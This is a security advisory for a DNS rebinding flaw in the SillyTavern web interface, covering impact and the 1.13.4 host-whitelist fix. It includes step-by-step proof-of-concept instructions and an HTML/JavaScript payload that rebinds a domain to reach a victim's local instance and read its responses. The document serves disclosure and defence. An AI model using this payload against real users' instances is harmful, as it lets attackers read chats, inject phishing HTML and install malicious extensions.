summary: "SillyTavern Web Interface Vulnerable DNS Rebinding\n### Summary\nThe web UI for SillyTavern\
  \ is susceptible to DNS rebinding, allowing attackers to perform actions like install malicious\
  \ extensions, read chats, inject arbitrary HTML for phishing, etc.\n\n### Details\nDNS rebinding\
  \ is a method to bypass the CORS policies by tricking the browser into resolving something\
  \ like `127.0.0.1` for a site's DNS address. This allows anybody to get remote access to anyone's\
  \ SillyTavern instance **without** it being exposed, just by visiting a website. \n\n### PoC\n\
  1. Host the PoC HTML file on a `/rebind.html` endpoint (or any other endpoint) on a web server\
  \ on port 8000\n2. Go to https://lock.cmpxchg8b.com/rebinder.html and input your IP address\
  \ (A) to rebind to 127.0.0.1 (B)\n3. Replace the URL in the HTML with the returned URL on\
  \ the site\n4. Go to `http://[URL]:8000/rebind.html` in firefox or on any mobile browser if\
  \ you're using termux\n5. Check the developer tools console. It should return all of the data\
  \ \n\nHere is the PoC code:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"\
  utf-8\">\n  <title>Rebind Payload</title>\n</head>\n<body>\n<script>\nasync function tryRebind()\
  \ {\n  while (true) {\n    try {\n      let res = await fetch(\"http://[DOMAIN HERE]:8000/\"\
  );\n      let text = await res.text();\n\n      if (text.includes(\"Directory listing for\
  \ /\")) {\n        console.log(\"Still attacker server, retrying...\");\n        await new\
  \ Promise(r => setTimeout(r, 2000));\n        continue;  // don't break yet\n      }\n\n \
  \     console.log(\"GOT VICTIM RESPONSE!\");\n      console.log(text.substring(0, 300));\n\
  \      break;\n\n    } catch (e) {\n      console.log(\"Fetch failed, retrying...\", e);\n\
  \      await new Promise(r => setTimeout(r, 2000));\n    }\n  }\n}\ntryRebind();\n</script>\n\
  </body>\n</html>\n```\n\n### Impact\nAttackers can read user chats, inject HTML for stuff\
  \ like phishing, download arbitrary malicious extensions, etc. Essentially gaining full control\
  \ over users' SillyTavern systems. \n\n### Resolution\nA vulnerability has been patched in\
  \ the version 1.13.4 by introducing a server configuration setting that enables a validation\
  \ of host names in inbound HTTP requests according to the provided list of allowed hosts:\
  \ `hostWhitelist.enabled` in config.yaml file or `SILLYTAVERN_HOSTWHITELIST_ENABLED` environment\
  \ variable.\n\nWhile the setting is disabled by default to honor a wide variety of existing\
  \ user configurations and maintain backwards compatibility, existing and new users are encouraged\
  \ to review their server configurations and apply necessary changes to their setup, especially\
  \ if hosting over the local network while not using SSL.\n\n- [Documentation](https://docs.sillytavern.app/administration/config-yaml/#host-whitelisting)\n\
  - [Security checklist](https://docs.sillytavern.app/administration/#security-checklist)\n\n\
  ### Resources\n- https://github.com/SillyTavern/SillyTavern/commit/d134abd50e4a416e3b81233242583b0a23f38320"
